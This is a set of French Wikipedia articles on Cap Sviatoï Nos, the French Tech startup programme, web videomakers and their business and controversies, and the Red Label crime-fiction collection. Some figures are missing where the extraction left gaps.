Le cap Sviatoï Nos (en , littéralement « Saint-Nez » est un cap situé sur la côte à l'est de la péninsule de Kola. La ligne qui relie ce cap au cap Kanine sur la péninsule de Kanine marque la limite entre la mer de Barents (au nord) et la mer Blanche (au sud). Il est situé sur une petite péninsule, également nommée Sviatoï Nos. Sur la péninsule se trouvent le village éponyme et le phare Sviatonoski. Le toponyme « Sviatoï Nos » est répandu sur la côte de l'océan Arctique, dans l'hypothèse de l'explorateur suédois Adolf Erik Nordenskiöld est le nom à Pomors.
Géographie.
Long d'environ et large de au maximum, le cap Sviatoï Nos s'élève jusqu'à une altitude de . Sur la péninsule il plusieurs petits lacs et les ruisseaux coulent en direction de la mer. Une station météorologique, un phare et une base militaire russe sont situés à proximité du cap.

</doc>
<doc id="8730039" url="https://fr.wikipedia.org/wiki?curid=8730039" title="Remodelage des lipides membranaires">
Remodelage des lipides membranaires



</doc>
<doc id="8730048" url="https://fr.wikipedia.org/wiki?curid=8730048" title="24e cérémonie des Dallas-Fort Worth Film Critics Association Awards">
24e cérémonie des Dallas-Fort Worth Film Critics Association Awards

La des (), décernés par la , a eu lieu le et a récompensé les films réalisés dans l'année.

</doc>
<doc id="8730054" url="https://fr.wikipedia.org/wiki?curid=8730054" title="French Tech">
French Tech

La mission French Tech, ou simplement French Tech, est une administration publique française chargée de soutenir la structuration et la croissance de l’écosystème des start-ups françaises, en France et à l'étranger. Au départ simple label attribué aux grandes métropoles comprenant un nombre notable d'entreprises innovantes, l'organisation s'est structurée au fil des années pour intégrer des missions telles que l'aide au développement à l'étranger, la facilitation des démarches administratives des entreprises ou l'accélération de start-ups. Elle est également à l'origine des labels Next40 et FT120.
Historique.
Lancement du label French Tech.
Le 27 novembre 2013, Fleur Pellerin, ministre déléguée chargée du Numérique et Louis Gallois, commissaire général pour l'investissement, officialisent la création du label « French Tech », terme préféré à « quartiers numériques » initialement choisi, car plus porteur à l'étranger. Il s'accompagne d'une enveloppe de 200 millions d'euros d'investissements. Son objectif est de mobiliser acteurs privés et publics pour favoriser la croissance et le rayonnement international des start-ups françaises, dans le but de faire émerger l'équivalent d'un Google français ou européen. En novembre 2014, neuf grandes villes françaises, parmi lesquelles Paris, Nantes ou Montpellier, reçoivent le label French Tech, valable pour trois ans. Cette première vague de labellisations fait suite à un audit de chaque ville candidate, où ont notamment été évalués le nombre de start-ups locales et leurs levées de fonds ou la présence dincubateurs et accélérateurs d'entreprises.
L'année suivante, Emmanuel Macron, ministre de l'Économie et Axelle Lemaire, successeure de Fleur Pellerin, annoncent un plan de développement de l'attractivité de la French Tech à l'étranger, notamment via un volet événementiel et le renforcement des French Tech Hubs, fédérant les communautés de start-uppers installées à l'étranger comme à Londres, Singapour ou Tel Aviv. Est également créé le French Tech Ticket, dispositif destiné à attirer les jeunes entrepreneurs étrangers, avec un objectif de 100 à 150 start-ups par an. Il donne à chaque entrepreneur un titre de séjour et une bourse de 1 500 euros par mois pendant un an ainsi qu'une aide à l'installation.
La mission French Tech.
Jusque-là installée au ministère de l'Économie et des Finances, à Bercy, la French Tech déménage en septembre 2017 pour s'installer dans les locaux de Station F, plus grand incubateur du monde inauguré le 29 juin précédent au sein de la halle Freyssinet, à Paris. Ce déménagement acte l'évolution du label en une structure de soutien à l'entrepreneuriat, avec l'objectif de rapprocher tous les acteurs de l'économie et de l'innovation : administration, start-ups ou instituts de recherche. La mission propose ainsi une simplification des démarches administratives pour les start-ups françaises ou l'accueil d'entrepreneurs étrangers et chercheurs voulant soumettre des projets d'entreprises.
La stratégie de la mission French Tech est recentrée sur trois axes en octobre 2018 : aider les startups à passer à l'échelle pour devenir des scale-ups, promouvoir la "tech for good" à l'impact social positif et mieux intégrer les femmes et la mixité sociale dans un écosystème tech jugé trop blanc, masculin et issus de milieux sociaux favorisés. Les métropoles en France et hubs à l'étranger labellisés French Tech, critiqués pour leur manque de dynamisme, sont remplacés par des capitales et communautés, ces dernières pouvant également être créées en France et être thématiques, dès lors qu'au moins vingt-cinq entrepreneurs s'accordent pour en lancer. Ce nouveau système place l'entrepreneur au coeur des initiatives et il n'est alors plus un simple acteur parmi d'autres entités publiques ou privées.
En 2023, dix ans après le lancement du label « French Tech », on constate que celui-ci a acquis une certaine notoriété, appuyée par une nette hausse des investissements dans l'écosystème et un nombre grandissant de licornes françaises, start-ups valorisée plus d'un milliard d'euros, comme ManoMano ou BlaBlaCar. Il participe ainsi à faire connaître le secteur, qui dénombre 25 000 start-ups cette année-là pour un million d'emplois directs ou indirects créés, auprès du grand public. Néanmoins, la France n'a pas fait émerger à cette date d'acteurs de niveau mondial.
Next40 et FT120.
Le gouvernement français crée au sein de la French Tech le label Next40 en 2019 pour soutenir et promouvoir quarante jeunes entreprises françaises qu'il considère comme prometteuses et susceptibles de remplacer un jour les membres du CAC 40. Il ne s'agit néanmoins pas d'un indice boursier. Des start-ups ayant connu une ascension certaine composent la première promotion, comme Doctolib, Mirakl ou Contentsquare. D'autres, en revanche, ont connu des destins moins glorieux, entre rachats et redressements judiciaires, comme Sigfox ou Cityscoot. Le FT120, pour French Tech 120, lancé au même moment et intégrant une sélection plus large de 120 start-ups, est considéré comme l'antichambre du Next40, les membres de ce dernier intégrant les deux labels.
Direction de la French Tech.
En 2014, David Monteau, ancien de l'INRIA devient le premier directeur de la Mission French Tech.
En mai 2018, David Monteau est remplacé par Kat Borlongan, alors dirigeante de Five by Five, agence spécialisée dans l'innovation qu'elle a cofondée en 2013.
En 2021, Clara Chappaz est nommée directrice de la French Tech, succédant à Kat Borlongan.
En septembre 2024, Julie Huguet, cofondatrice de la plateforme de mise en relation entre freelances et entreprises, Coworkees, devient la nouvelle directrice de la Mission French Tech.
Villes labellisées.
Le réseau French Tech est principalement basé en France métropolitaine ; il compte en 2016 treize métropoles labellisées en leur nom. À partir de 2015 sont mis en place les réseaux thématiques French Tech auxquels appartiennent les métropoles labellisées mais également d'autres écosystèmes locaux. Toutefois l'appartenance à un réseau thématique French Tech ne confère pas le label à la métropole concernée. Faute d'avoir trouvé leur modèle, les réseaux thématiques sont supprimés en 2018.
En novembre 2014, neuf métropoles (Aix-Marseille, Bordeaux, Grenoble, Lille, Lyon, Montpellier, Nantes, Rennes et Toulouse) sont labellisées.
En juin 2015, quatre nouveaux « écosystèmes » sont labellisés :
Puis en juillet 2016 est créé :
À cette liste se rajoutent quatre écosystèmes thématiques :
Par la même occasion, la ministre Axelle Lemaire annonce que New York devient la première ville étrangère à être labellisée French Tech en 2015.
Initialement prévues pour le printemps 2016, de nouvelles labellisations pour des réseaux thématiques sont annoncées le à Laval, où les 13 métropoles French Tech sont également confirmées par Emmanuel Macron, ministre de l'Économie et du Numérique, et Axelle Lemaire, secrétaire d'État chargé du numérique. Les réseaux thématiques sont au nombre de neuf : HealthTech : BioTech MedTech e-sante ; IoT Manufacturing ; EdTech Entertainment ; CleanTech Mobility ; FinTech ; Security Privacy ; Retail ; FoodTech. Outre les métropoles French Tech, ils rassemblent les pôles de développement suivants : Alsace, Amiens, Angers, Avignon, Chalon-sur-Saône, Clermont-Ferrand, Dijon, Grand Besançon Métropole, Hossegor - Saint-Jean-de-Luz, Laval, La Réunion, Le Mans, Limoges, Angoulême - La Rochelle – Niort - Poitiers, Nogent / Haute Marne, Reims, Saint-Étienne, Saint-Quentin, Tarbes, Toulon, Vendée.
La French Tech Rennes Saint Malo.
Labellisée parmi les premières villes en 2014, Rennes s'est associée à la Ville de Saint-Malo. Un bâtiment Totem a ouvert en septembre 2016 sur 2000 m² proposant 3 étages : un start-up hôtel qui regroupe plusieurs start-up rennaises, un étage dédié au travail collaboratif et un étage permettant de recevoir des événements.
La French Tech Rennes Saint-Malo sponsorise un trimaran.
Depuis 2018, l'association chargée de la French Tech Rennes Saint-Malo se nomme Le Poool.
Le réseau French Tech.
La French Tech se compose de 121 entités à travers le monde dont 13 capitales et 45 communautés en France, ainsi que 63 communautés à l'étranger.
À l'étranger, des villes comme Londres en Grande-Bretagne, Abidjan en Côte d'Ivoire, Hong Kong ou encore Shenzhen en Chine, font partie des French Tech Hubs officiellement labellisés.

</doc>
<doc id="8730063" url="https://fr.wikipedia.org/wiki?curid=8730063" title="SS Atlantic">
SS Atlantic



</doc>
<doc id="8730066" url="https://fr.wikipedia.org/wiki?curid=8730066" title="Vidéaste web">
Vidéaste web

Un ou une vidéaste web (souvent surnommé youtubeur ou youtubeuse en référence à YouTube) est un vidéaste qui réalise et publie régulièrement du contenu vidéo sur un site d’hébergement de vidéos (comme YouTube ou Vimeo), un blogue, ou un réseau social (Facebook, Instagram, TikTok, Twitch ou anciennement Vine). Le terme peut recouvrir diverses fonctions déjà existantes telles que réalisateur, scénariste, producteur ou acteur.
Cette activité peut générer des revenus notamment grâce aux recettes de la publicité en ligne, au financement participatif, aux produits dérivés ou aux partenariats commerciaux (sponsoring, placement de produit).
Depuis les années 2010, le développement de cette activité provoque l'émergence de vedettes : voir notamment la liste des comptes Instagram les plus suivis, la liste des chaînes Twitch les plus suivies et la liste des comptes TikTok les plus suivis.
Histoire.
En 2005, aux États-Unis, la création de YouTube, un site web d'hébergement de vidéos, a permis à des gens ordinaires d'accéder à la célébrité, en diffusant auprès du plus grand nombre leurs œuvres en tout genre. Dans un second temps, Twitter (acquéreur de Vine), Facebook et Instagram (via IGTV) se positionnent comme plateforme vidéo et mettent en avant des créateurs. En France, c'est la plateforme Dailymotion qui permet à certains créateurs de diffuser plus largement leurs vidéos (Cyprien Iov, Norman Thavaud, Hugo Dessioux, etc.). Après l'échec de la revente à Yahoo de Dailymotion, les audiences du site ont baissé, et les principaux créateurs se sont tournés vers YouTube. De 2010 à sa fermeture en 2017, Vine a permis l'apparition de nombreuses personnalités, comme Jérôme Jarre ou encore Logan Paul. Depuis 2015, les plateformes vidéo YouNow ou Musical.ly (devenu TikTok) ont fait éclore plusieurs personnalités.
Le terme "youtubeur" ("" en anglais) est un néologisme dérivé du nom du site. En 2017, "youtubeur" fait officiellement son entrée dans le dictionnaire Le Petit Robert. Les termes d'instagrameurs, vineurs ou tweeps sont aussi utilisés.
Internet connaît un grand succès dans le partage de contenu vidéo à caractère humoristique ou didactique. Diverses thématiques se sont développés, tels que les vidéos sur le thème de la beauté et du maquillage, les vidéos de vulgarisation, les vidéos de jeux vidéo, les clips musicaux ou des thèmes plus politiques.
Certains vidéastes web, grâce à leur visibilité sur Internet et à la viralité de leurs vidéos, attirent un public grandissant, jusqu'à devenir des vedettes. Les vidéastes les plus connus comptent plusieurs millions d'abonnés, et cumulent un ou plusieurs milliards de vues.
Le développement de ce média est surtout important chez les jeunes. Ce phénomène est donc parfois mal compris par les parents et a des conséquences sur l'éducation.
Professionnalisation.
Parmi des millions de vidéastes, la plupart postent des vidéos pour le plaisir, sans objectif financier. Une minorité passe du loisir à une activité rémunérée, voire travail à temps plein pour certains.
Les vidéastes professionnels produisent des vidéos qui peuvent parfois mobiliser une équipe de techniciens. Dans cette optique, des vidéastes peuvent être employés et produits par de grands groupes, tels que Groupe M6 avec Golden Moustache ou Canal+ avec Studio Bagel. D'autres peuvent être indépendants, comme Antoine Daniel.
Tout comme pour les autres métiers artistiques, les revenus peuvent être instables et précaires, même lors de vidéos virales.
Selon des estimations datant de 2015, en France, plusieurs dizaines de personnes réussiraient à bien gagner leur vie grâce à YouTube. La même année, le magazine "Forbes" publie pour la première fois un classement des youtubeurs les plus riches, avec en tête le vidéaste suédois PewDiePie, qui à 25 ans a déjà gagné 12 millions de dollars, suivi dans le top 10 par des youtubeurs américains et britanniques (Smosh, Fine Brothers, Rhett and Link…).
Production et rémunération.
Publicités.
Les vidéastes sont généralement rémunérés grâce à une régie publicitaire qui place des publicités avant, durant ou après leurs vidéos. Ces publicités peuvent être évitées, notamment à l'aide d'un logiciel antipub tels qu'Adblock Plus ou UBlock Origin, coupant la rémunération.
Les réseaux multichaînes, auxquels peuvent s'affilier les vidéastes, peuvent vendre des publicités spécifiques pour la chaine, ou des opérations publicitaires dans la vidéo. Elles agissent également en tant qu'ayant droit sur la plateforme. Agissant comme des régies publicitaires ou un agent, ils touchent un pourcentage des revenus générés.
Partenariats commerciaux.
Des marques payent certains vidéastes pour promouvoir leurs produits dans le contenu, les placements de produit. Le plus souvent, les concepts de vidéos sont faits pour que le produit s'intègre dans le contenu.
Les partenariats laissent aux vidéastes une marge de manœuvre plus ou moins inexistante selon les marques, .
L'affiliation peut également être une source de revenus. Par exemple, certains vidéastes littéraires tirent un revenu grâce à un lien qu'ils affichent, pointant vers la page internet où l'on peut acheter le livre en ligne.
Ces partenariats peuvent également être fait par l'intermédiaire d'agences de communication ou via des plates-formes de mise en relation entre les marques et les vidéastes.
Les créateurs plus connus sont en outre convoités par de grandes marques en tant qu'égérie ou ambassadeur, comme Sananas devenue égérie d'Yves-Saint-Laurent ou Brendan Jordan, surnommé « la teen-diva », devenue égérie de American Apparel.
Leur popularité leur permet parfois de sortir un livre, comme "Icônne" écrit par Natoo, ou un album, comme l'album de rap "Double V" de Mister V.
Diversification de l'activité.
Certains vidéastes profitent de leur notoriété pour créer des lignes de cosmétiques ou de vêtements (à l'instar de Michelle Phan). D'autres peuvent profiter de leur notoriété pour apparaître au cinéma (c'est le cas de Cyprien Iov, Natoo et Squeezie, qui ont été sollicités pour le doublage du film "").
Financement participatif.
Le financement participatif fait également partie des sources de financements via Patreon, ou Tipeee, faits pour les vidéastes, ou des plateformes de crowdfunding généraliste comme KissKissBankBank. Les premières permettent aux spectateurs de verser une somme d'argent à chaque publication, tandis que les secondes sont plus destinées à des projets ponctuels. C'est le cas de l'émission "Chroma" de Karim Debbache, Gilles Stella et Jérémy Morvan, financée "via" le site web Ulule. Le record est détenu par la série Noob.
Financement public.
Comme n'importe quels producteurs, les vidéastes web peuvent faire l'objet de subvention publiques. Depuis 2018, le Centre national de la cinématographie a ouvert un guichet d'aides destinées aux productions à destination d'Internet.
Problématiques et controverses.
Réutilisation de contenu soumis au droit d'auteur.
Malgré le principe de "fair use" (« usage loyal »), qui permet la réutilisation de contenus soumis au droit d'auteur dans la limite de certains critères, les vidéastes sont souvent attaqués par les ayants droit pour l’utilisation de leur contenu, même si elle entre dans le cadre autorisé.
En 2011 et 2012, les trois traités dits SOPA, PIPA et ACTA ont tour à tour failli être adoptés. Ils auraient eu pour conséquence l'interdiction de réutiliser des contenus soumis au droit d'auteur sur le web, avec un impact potentiellement important sur YouTube. SOPA et PIPA ont fait l'objet de nombreuses manifestations d'opposition, tant réelles que virtuelles, qui leur ont valu un report "sine die".
En 2012, une pétition est lancée pour sur le site Avaaz.org, et le message est relayé par plusieurs youtubeurs, qui considèrent ces traités comme liberticides et prévoient la difficulté, si ce n'est l'impossibilité, de continuer à produire du contenu si le traité venait à être adopté. Le traité est finalement rejeté.
En décembre 2013, YouTube fait l'objet d'une polémique, lorsque le site implémente quelques modifications à sa politique concernant les droits d'auteur. En effet, les modifications de "Content ID" permettent de remonétiser ou de supprimer des vidéos contenant des extraits vidéos ou audios soumis au "copyright". Jusqu'alors les youtubeurs sont soumis au "fair use", qui leur permet d'utiliser des contenus sous copyright dans le cadre d'un travail créatif. Avec ces changements, les ayants droit ont la possibilité d'agir sur les vidéos créées par les youtubeurs, en les monétisant à leur place lorsqu'il s'agit de youtubeurs connus ayant un fort potentiel en ce qui concerne les recettes publicitaires, ou en les supprimant purement et simplement lorsqu'il s'agit de youtubeurs anonymes ou peu notoires. Cependant, le système génère beaucoup de faux positifs, et permet également des revendications qui, au regard du "fair use", pourraient être vues comme abusives, fonctionnant sur la base de la .
Les revendications "Content ID" abusives et la non-application du principe de "fair use" font souvent l'objet de controverses. En 2016, les youtubeurs anglophones posent la question « "Where's the Fair use ?" » ().
Conditions de monétisation.
Les plateformes limitent les contenus monétisables selon la demande des annonceurs (violence verbale, caractère sexuel, substances illicites, sujets sensibles, conflits armés, politique, catastrophes naturelles…). En 2016 puis 2018, sous la pression d'annonceurs, YouTube démonétise les vidéos ne respectant pas ces conditions, déclenchant des réactions de créateurs.
Utilisation des enfants.
Certaines chaînes web publient du contenu mettant en vedette des enfants. Il existe en effet des chaînes où des enfants sont filmés en train de déballer des jouets, face caméra. Ce genre de vidéos, d'abord apparu aux États-Unis, s'est répandu sur la plateforme YouTube francophone avec l'apparition de chaînes comme Studio Bubble Tea, Démo Jouets et Swan The Voice. Cette participation est parfois considérée comme une utilisation des enfants.
Plusieurs vidéastes s'en sont indignés. La publication de vidéos sur le web est une activité lucrative, qui de surcroît expose les personnes apparaissant dans ces vidéos aux yeux du grand public, alors que parfois même les parents ne se montrent pas. Les enfants manqueraient de recul pour comprendre ce qui leur arrive. Le rythme de publication, parfois jusqu'à une fois par jour, est aussi critiqué. Certains internautes considèrent de plus que les enfants, public ciblé par ce type de contenu, sont plus influençables ; et que le fait qu'ils regardent peut-être quotidiennement des vidéos incitant selon eux à la surconsommation pose un problème moral.
Début 2017, Mike et Heather Martin, parents de cinq enfants et propriétaires de la chaîne YouTube américaine de plus de , perdent la garde de deux de leurs enfants, que Mike avait eu avec une première femme et qu'ils s'amusaient à humilier en vidéo. Par exemple, ils leur faisaient croire qu'ils étaient adoptés, détruisaient leurs jeux ou les encourageaient à se frapper. L'affaire, dévoilée sur le web anglophone au grand public par le vidéaste et dans la francophonie par Le Roi des rats, est largement médiatisée. Deux ans après, un cas similaire est dévoilé : l'Arizonienne Machelle Hobson frappait, enfermait et gazait ses enfants au lacrymogène s'ils ne pour les vidéos de sa chaîne .
Publicité.
Publicité dissimulée.
Il arrive que des vidéastes soient rémunérés par une entreprise pour parler de ses produits sans que cette relation commerciale ne soit explicitement mentionnée. L'autopromotion est également pratiquée. En France, des enquêteurs de la DGCCRF se penchent sur ces pratiques de publicités dissimulées en 2016, et s'intéressent aux cas d'une dizaine de YouTubeurs ayant perçus des sommes comprises entre et euros pour promouvoir une marque de voiture, sans que la relation contractuelle les liant au constructeur ne soit mentionnée.
En , Microsoft aurait négocié un accord commercial avec Machinima, fournisseur de contenu sur YouTube, pour garantir une contrepartie financière en cas de promotion avantageuse pour la Xbox One, avec comme seule condition que l'accord reste confidentiel. Révélée par Ars Technica, l'information corrobore les fuites du site iGR, qui mettait en lumière les consignes données par Machinima à ses « partenaires influents ». Les conditions rendues publiques sur Pastebin dévoilent que les « "influenceurs" » devaient s'engager à &lt;ref name="Machinima/Youtube"&gt;.&lt;/ref&gt;.
Également en 2014, lors de la sortie de "", la société Warner Bros. rémunère de nombreux vidéastes, dont PewDiePie, jusqu'à plusieurs dizaines de milliers de dollars pour promouvoir le jeu sur YouTube et les réseaux sociaux. L'accord interdit la mention de bugs ou de problèmes liés au logiciel. La Federal Trade Commission rapporte en 2016 que la plupart des vidéos ne sont pas signalées comme sponsorisées, et plusieurs de ces vidéastes mentionnent seulement avoir reçu un accès anticipé au jeu.
De manière à rendre plus transparents les partenariats entre vidéastes et marques, Youtube a mis à disposition des vidéastes une fonctionnalité permettant d'indiquer au début de sa vidéo que celle-ci contient une communication commerciale. De même, l'ARPP a publié les règles de bonnes pratique et de transparence dans le cadre de ces partenariats.
Placement de produit non dissimulé pendant la vidéo.
Malgré une aversion pour la publicité, avec entre 30% et 60% des internautes utilisant des bloqueurs de publicité, le nombre de vidéos contenant des placements de produit semble augmenter sur la plateforme Youtube.
Relations avec les autres médias.
Des vidéastes se sont plaints que les médias de masse (télévision, presse écrite et sites d'actualité) donnent d'eux une image négative. Le passage de Natoo dans l'émission "On n'est pas couché" a suscité des critiques, certains estimant que le comportement de Léa Salamé envers la vidéaste était condescendant et méprisant, lui demandant combien sa chaîne lui faisait gagner, alors que la vidéaste était venue pour faire la promotion de son livre.
La critique la plus souvent adressée à ces médias est de davantage s'intéresser aux revenus des vidéastes qu'au fond de leur activité.
Conventions.
Les vidéastes sont parfois invités à des conventions, comme la Paris Games Week ou la Japan Expo, ayant souvent trait à la culture populaire et Internet.
En France, des rassemblements spécialisés sur l'activité de vidéaste sont organisés depuis 2015. Aux États-Unis, VidCon existe depuis 2010.
En , Neocast, regroupant 45 créateurs au palais de la musique et des congrès à Strasbourg, réunit .
En 2015 puis 2017, rassemble à Paris plus de 150 vidéastes proposant des séances de dédicaces, des démonstrations ou encore des conférences d'aide à la création de vidéos. L'évènement est financé par plusieurs chaines de télévisions et marques.
Au Québec, la première rencontre destinée à l'univers de YouTube, nommée OhMyFest!, s'est tenue les 16 et au Monument national à Montréal.
Thématiques abordées.
Même si internet permet d'aborder tous les sujets, certaines thématiques ressortent :
Humour.
L'humour étant très présent sur internet, une grande part des vidéastes produit du contenu comique.
Les monologues comiques, constituent un type de vidéos qui siège parmi les premiers apparus sur YouTube, et qui a connu et connaît une grande popularité auprès du public francophone. Cyprien ou de Norman, sont respectivement deuxième et sixième vidéastes francophones sur YouTube par nombre d'abonnés en décembre 2023. Ils possèdent toutes les caractéristiques d'un sketch, augmenté grâce au montage vidéo. Les vidéastes adeptes de ce type de contenu se basent souvent sur des événements communs de la vie quotidienne, jouant ainsi sur l'identification du spectateur. D'autres vidéastes francophones connus officient dans le monologue comique, comme Hugo Dessioux (Hugo Tout Seul).
Des caméras cachées sont également publiées sur le web, comme les créations de Rémi Gaillard.
Des vidéos insolites, propices au buzz, sont publiées en grand nombre sur le web. Elles peuvent parfois être à l'origine de mèmes. Ces vidéos sont parfois utilisées par d'autres vidéastes, les incluant dans un réel concept, par exemple :
Jeux vidéo.
Les vidéos avec pour thème le jeu vidéo sont divisées en de nombreux concepts distincts :
Les vidéos sur le jeu vidéo peuvent être orientées sur des jeux vidéo dits « Triple-A » (issus de grands studios de développement), sur des jeux vidéo indépendants (issus de petits studios de développement), ou même sur des jeux vidéo anciens (il s'agit alors d'une pratique nommée rétrogaming, avec pour vidéastes notoires le Joueur du Grenier ou encore l'Angry Video Game Nerd).
Les joueurs disposent de moyens importants afin de partager leur expérience. Sur console, les grandes entreprises du jeu vidéo lient des partenariats avec YouTube, tels que Sony et sa PlayStation 4. Cela permet aux joueurs de poster facilement leurs vidéos, par le biais d'une interface dédiée. Sur PC également, enregistrer ses sessions de jeux est devenu très simple grâce à plusieurs logiciels. Grâce à tous ces moyens de partage, YouTube devient un grand réseau où les joueurs partagent leurs expériences.
Afin de concurrencer Twitch (groupe Amazon), YouTube lance fin 2016 YouTube Gaming qui regroupe vidéos et directs autour de l'univers des jeux vidéo. Les plateformes permettent aux joueurs de diffuser leur session de jeu en direct et d'interagir avec ses "viewers" grâce au tchat.
Beauté.
Les vidéos beauté sont réalisées par des vidéastes qui donnent des conseils esthétiques, principalement de maquillage.
Leur public peut être influencé par les vidéastes actuels, d'où une recrudescence de chaînes similaires, parfois tenues par des personnes très jeunes.
EnjoyPhoenix, Bethany Mota, CutiePieMarzia, Shera Kerienski produisent ce genre de vidéos.
Ce type de vidéos englobe plusieurs concepts qui lui sont spécifiques :
Les vidéastes œuvrant dans le domaine de la beauté ont un impact grandissant sur leur public. Ces vidéastes deviennent des exemples, et certain(e)s jeunes adolescent(e)s les imitent en mettant à leur tour des vidéos en ligne. Certaines vidéastes connues ont elles-mêmes commencé jeunes, ignorant l'engouement qu'allaient susciter leurs vidéos.
Contenu éducatif et vulgarisation.
Certains vidéastes ont commencé au milieu des années 2010 à créer du contenu visant à vulgariser des sujets relatifs aux sciences, alors qu'auparavant sur YouTube on trouvait presque exclusivement du contenu humoristique (certes encore majoritaire). Le gouvernement français a mis en ligne en une liste de 350 chaînes francophones à contenu culturel ou scientifique utilisables comme ressources pédagogiques.
Ainsi, des vidéastes tels que Guillaume Saës "(Science Trash)", Bruce Benamran ("e-penser") ou David Louapre ("ScienceÉtonnante") vulgarisent les sciences en général. Léo Grasset ("DirtyBiology") propose, lui, des vidéos dans le domaine de la biologie. Mickaël Launay ("MicMaths") traite des mathématiques et Nathan Uyttendaele de la statistique. Dr Nozman, quant à lui, propose des vidéos sur des sujets aléatoires, similaires à ceux cités précédemment, ou bien répond dans ses vidéos à des questions posées par des utilisateurs et Max Bird parle des idées reçues. Les langues sont traitées par "Ma vie aux Etats-Unis" pour l'anglais et par Lunatrix Lovestrange ou Linguisticae pour le français.
Vsauce est un vidéaste populaire sur le YouTube anglophone qui traite de différents sujets scientifiques et philosophiques.
Certaines vidéos traitent de sciences humaines et sociales telles que l'histoire (Manon Bril de C’est une autre histoire ou Nota Bene), l'archéologie (avec Charlie Danger des Revues du monde) la psychologie (LePsyLab) ou la philosophie (Dany Caligula, Cyrus North Mr Phi, ou la web-série "Et tout le monde s'en fout").
Certaines chaînes YouTube telles qu"'Axolot" (Patrick Baud), Doc Seven ou "Trash" abordent des thèmes plus généraux dans des domaines variés et peuvent prendre la forme de tops. D'autres, telle la chaîne "Le Fil d'Actu", traitent d'actualité sous la forme d'un journal hebdomadaire.
La chaine YouTube Mamytwink (Florian Henn, Zecharia, François Calvier) aborde plusieurs thèmes, le Jeu vidéo anciennement avec des vidéos sur World of Warcraft, Hearthstone, Overwatch. Et plus récemment avec des séries éducatives sur l'Histoire comme : et .
Politique.
Concernant le YouTube francophone, les premières vidéos d'Alain Soral rencontrent un certain succès dès la fin des années 2000 dans des monologues aux thèmes d'extrême-droite mâtinés de marxisme. C'est ensuite Usul qui introduit plus ou moins explicitement des traits politiques dans "3615 Usul," web-série abordant le thème du jeu vidéo. Usul et OsonsCauser disent tous qu'ils ont commencé à parler de politique sur YouTube pour faire pièce et proposer une alternative critique au succès grandissant des vidéos d'Alain Soral durant les années 2010. Le succès de Soral est tel que le Premier ministre Manuel Valls le désigne officiellement comme ennemi le lors de l'université d'été du PS et lors du discours du . Avec les élections présidentielles et législatives en France en 2017, des vidéastes politiques et des politiciens de métier font leur apparition sur YouTube. Jean-Luc Mélenchon domine les chiffres, tandis que François Asselineau et son parti l'UPR totalisent en juillet 2020 près de 115 000 abonnés, pourtant considéré par "Slate", comme pionnier sur la plateforme. Parmi eux on compte Cyrus North ou Usul via "Mes chers contemporains".
Arts et critique d'art.
Cinéma.
Il peut s'agir de critiques, de chroniques, ou de courts-métrages. Karim Debbache avec les émissions "Crossed" et "Chroma" ainsi que François Theurel produisent ce type de contenu.
Musique.
Les vidéos musicales sont des vidéos dans lesquelles il est question de performance musicale et/ou vocale, ou de l'analyse de celles-ci :
Littérature.
Les chroniqueurs littéraires sur YouTube sont connus sous le nom de « booktubeurs » (contraction de « "book" », livre, et « youtubeur ») et ont d'abord fait leur apparition aux États-Unis, au Royaume-Uni et dans le monde hispanophone à la fin des années 2000.
Dans la francophonie, c'est au début des années 2010 que le phénomène apparaît.
Le booktubing est aujourd'hui également utilisé par les écoles et les bibliothèques pour emmener les adolescents à partager leur passion pour la littérature. Il est possible d'utiliser le booktube à des fins pédagogiques en classe. De ce fait, on cherche à concilier enseignement de la langue et éducation aux médias.
Les booktubeurs s'adressent la plupart du temps à un public jeune et mettent en place les mêmes procédés que les autres vidéastes, telles que l'« "unboxing" » (le fait d'ouvrir un colis devant sa caméra et qui vient du monde du jeu vidéo), ce qui les intègre parfaitement dans cette communauté.
Parmi eux Margaud Quartenoud, Nine Gorman, Jeanne Seignol.
Photographie.
Des vidéos en lien avec la pratique de la photographie, de conseils et d’apprentissage technique ou de présentation et de test de matériel photographique, souvent réalisées par des photographes de profession.
Parmi eux ; Chris Hau, Kai W, Jessica Kobeissi ou encore Nigel Danson.
Côté francophones, on trouve les vidéastes : F/1.4 - Sébastien Roignant, ObjectifPhotographe, Mon Petit Reflex, Lina Khezzar Photographie.
Des vidéastes proposent également du contenu spécialisé dans certains domaines : Photo Synthèse et Icono Mecano Maniac traitent de l'histoire de la photographie, EMGK Photographie ou Clic Argentique quant à eux, proposent du contenu vidéo sur la photographie argentique.
Religion.
Certains vidéastes créent du contenu uniquement en lien avec la religion, celui-ci pouvant être théologique ou sociétal par exemple. Parmi les francophones, il est possible de citer pour la religion catholique le frère dominicain Paul-Adrien d'Hardemare, anciennement le père Mathieu, Queer Chrétien(ne). Le phénomène est également présent à l'international avec le youtubeur australien Kamal Saleh de la chaîne Talk Islam, ou l'influenceuse chrétienne américaine Sadie Robertson.
Formats de contenu vidéo.
Certains formats de vidéos sont courants quelle que soit la thématique abordée, parmi lesquels :
Vidéastes et chaînes notables.
YouTube.
Vidéastes.
Ci-dessous, le tableau récapitulant les 15 vidéastes actifs sur YouTube comptant le plus d'abonnés en France, puis dans le monde (chaînes sans vidéaste ou de rediffusion exclues).
 France
 Monde
Chaînes.
Ci-dessous les tableaux récapitulant les 15 chaînes YouTube comptant le plus d'abonnés, d'abord en France, puis dans le monde.
 France
 Monde
Dailymotion.
Chaînes.
Ci-dessous, le tableau récapitulant les 10 chaînes comptant le plus d'abonnés tous pays confondus.
 Monde
&lt;br&gt;

</doc>
<doc id="8730068" url="https://fr.wikipedia.org/wiki?curid=8730068" title="Letterenhuis">
Letterenhuis



</doc>
<doc id="8730075" url="https://fr.wikipedia.org/wiki?curid=8730075" title="Red Label">
Red Label

 est une collection de littérature policière fondée par François Guérif en 1977 aux éditions PAC.
Historique.
La collection est créée à une époque où le genre science-fiction prédomine la littérature populaire ; réduction du nombre de volumes à la Série noire, disparition d'Un mystère, Le Masque cantonné aux classiques comme Agatha Christie. Les représentants commerciaux de Hachette, diffuseur des éditions PAC sont sceptiques sur la possibilité de vente des livres des auteurs comme David Goodis, Fredric Brown ou Robert Bloch.
Le nom de la collection est choisi par l'éditeur. Il était prévu que la marque de scotch Johnnie Walker sponsorise la collection, Red Label étant leur produit phare. 
Les jaquettes sont uniformes, sur fond rouge glacé sans dessin, ni photo avec le titre en haut, le logo Red label au centre et le nom de l'auteur en bas, François Guérif jugeant les couvertures .
La collection s'arrête en 1980 après la publication de vingt-cinq titres de quatorze auteurs.

</doc>
<doc id="8730082" url="https://fr.wikipedia.org/wiki?curid=8730082" title="L'assassin sera à Tripoli">
